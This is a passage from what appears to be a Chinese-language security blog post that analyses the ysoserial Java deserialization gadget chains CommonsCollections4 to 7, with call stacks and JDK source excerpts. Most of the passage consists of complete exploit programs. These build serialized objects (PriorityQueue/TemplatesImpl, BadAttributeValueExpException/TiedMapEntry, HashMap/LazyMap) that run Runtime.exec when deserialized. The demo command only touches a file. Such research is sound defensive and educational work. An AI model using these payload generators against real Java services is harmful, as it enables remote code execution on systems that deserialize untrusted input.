class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Placeholder</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String TrAXFilter = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Placeholder.class));</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Class.forName(AbstractTranslet)));</span><br><span class="line"></span><br><span class="line">        CtClass placeholder = classPool.get(Placeholder.class.getName());</span><br><span class="line">        placeholder.setSuperclass(classPool.get(Class.forName(AbstractTranslet).getName()));</span><br><span class="line">        placeholder.makeClassInitializer().insertBefore(<span class="string">"java.lang.Runtime.getRuntime().exec(\"touch /dev/shm/rmb122_test1\");"</span>);</span><br><span class="line">        placeholder.setName(<span class="string">"demo.rmb122."</span> + System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytecode = placeholder.toBytecode();</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(TemplatesImpl).getConstructor(<span class="keyword">new</span> Class[]&#123;&#125;).newInstance();</span><br><span class="line">        Field fieldByteCodes = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldByteCodes.set(templates, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line"></span><br><span class="line">        Field fieldName = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldName.set(templates, <span class="string">"rmb122"</span>);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.forName(TrAXFilter)),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templates&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chainedTransformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field = PriorityQueue.class.getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] innerArr = (Object[]) field.get(queue);</span><br><span class="line">        innerArr[<span class="number">0</span>] = templates;</span><br><span class="line">        innerArr[<span class="number">1</span>] = templates;</span><br><span class="line"></span><br><span class="line">        field = PriorityQueue.class.getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h2><p>这个不是换汤不换药了, 用了一个新的利用链去触发 InvokerTransformer, 不过 ysoserial 上注释里面的调用链是错误的, 估计是忘记改了. 正确的如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        BadAttributeValueExpException.readObject()</span><br><span class="line">            TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>从注释里面还可以得到, 这个 chain 只能用于 &gt;= 8u76, 且 SecurityManager 未设置的情况下使用.<br>原因是在 8u76 的更新里面, 添加了 <code>javax.management.BadAttributeValueExpException</code> 的 readObject 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        val = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到, 在 <code>System.getSecurityManager() == null</code> 的情况下, 将会不管 valObj 的类型, 调用 toString 方法, 这里需要配合 <code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 来使用, 其重写的 toString 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到熟悉的 map.get 了么, 这里就又回到了 LazyMap 的那一套, 接下来也不用多说了, exp 如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/asdasd_1"</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="string">"placeholder"</span>);</span><br><span class="line">        Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外, 这一条链, 其实 3, 4 都能使用, 不过 ysoseiral 只在 exp 里面写了 3 的, 实际上只要将 import 的 xxx.collections.xxx 全改成 xxx.collections4.xxx, 然后将 <code>LazyMap.decorate</code> 改为 <code>LazyMap.LazyMap</code> 就能直接给 4 使用.</p><h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><p>还是先看调用栈:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">        java.util.HashSet.readObject()</span><br><span class="line">            java.util.HashMap.put()</span><br><span class="line">            java.util.HashMap.hash()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                    org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                        org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                        org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                        java.lang.reflect.Method.invoke()</span><br><span class="line">                            java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure><p>这条与 CommonsCollections5 类似, 触发点由 BadAttributeValueExpException 改为 HashSet, 这里与 URLDNS 类似, 在反序列化时会重新计算对象的 hashCode, 而刚刚好 TiedMapEntry 的 hashCode 里面与 toString 一样也用到了 getValue.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>不过这里比较奇怪的是 HashMap 就已经有 hashCode 了, 不知道为什么还要再套一层 HashSet. 我自己重新编写的时候是直接用的 HashMap 作为触发点.</p><p>exp 如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] fake = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"placeholder"</span>),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/asdasd_1"</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(fake);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">"zzzz"</span>);</span><br><span class="line"></span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(<span class="string">"iTransformers"</span>); <span class="comment">// 将真正的 transformers 设置, 不然在生成 exp 时就会执行命令, 自己打自己了</span></span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line">        innerMap.clear(); <span class="comment">// 清除 LazyMap 产生的缓存</span></span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样, 这套 exp 在 3, 4 都是通用的, 只需要更改 <code>LazyMap.decorate</code> 即可, 在 4 中是 <code>LazyMap.LazyMap</code>, 效果是是一样的, 只是方法名换了一个.</p><h2 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h2><p>仍然先看调用栈:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Payload method chain:</span><br><span class="line">    java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br></pre></td></tr></table></figure><p>仍然是用 LazyMap 导致 RCE, 相比 TransformingComparator, LazyMap 在 3, 4 中都可以用, 泛用性会更好. 这里触发 Lazy.get 的方式是利用 HashMap/Hashtable readObject 会重建内部的哈希表的特性. 在遇到 hash 碰撞的时候, 会调用其中一个对象的 equals 方法来对比两个对象是否相同来判断是否真的是 hash 碰撞. 在这之中使用的是父类 <code>AbstractMap</code> 的 equals 方法.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">    <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K, V&gt; e : entrySet()) &#123;</span><br><span class="line">            K key = e.getKey();</span><br><span class="line">            V value = e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key) == <span class="keyword">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key))) <span class="comment">// &lt;-- 对于我们的 exp 来说, 会在这里会触发</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个方法比较两个 Map 的大小, 并对比所有 key, value 都相等. 在其中使用了 get 方法, 触发了 Lazy.get.<br>在 ysoseiral 中使用的是 Hashtable 类, 实际上 HashMap 也是能够触发的.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 